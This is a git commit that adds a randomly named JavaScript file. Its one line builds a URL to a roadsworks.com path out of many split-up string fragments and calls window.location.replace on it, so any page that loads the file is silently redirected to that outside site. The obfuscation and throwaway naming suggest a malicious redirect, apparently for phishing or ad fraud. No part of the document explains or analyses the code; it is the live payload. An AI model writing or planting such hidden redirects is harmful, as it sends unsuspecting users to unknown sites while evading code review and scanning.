5b8b336cdd6fda0ad6a66ee44ef73bb2eca8beab
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-05 14:58:17 +0100

    Create rthdtrthdtyhthdfthtfyhsrdtghdrth.js

---
+++ rthdtrthdtyhthdfthtfyhsrdtghdrth.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswo`,`rks.c`,`om/gQ_h`,`BEIKQRf`,`ugBl4S`,`r-C7B4uJ`,`OrwXJPi`,`gVd3InLC`,`flbY93Lua`,`L-CFyH66x`,`gXncWcC_DN`,`5n8kbVAj6`,`miHPLE4`,`Xw~~/TA`,`HA/NNN`,`bOiiw4uDZv`))
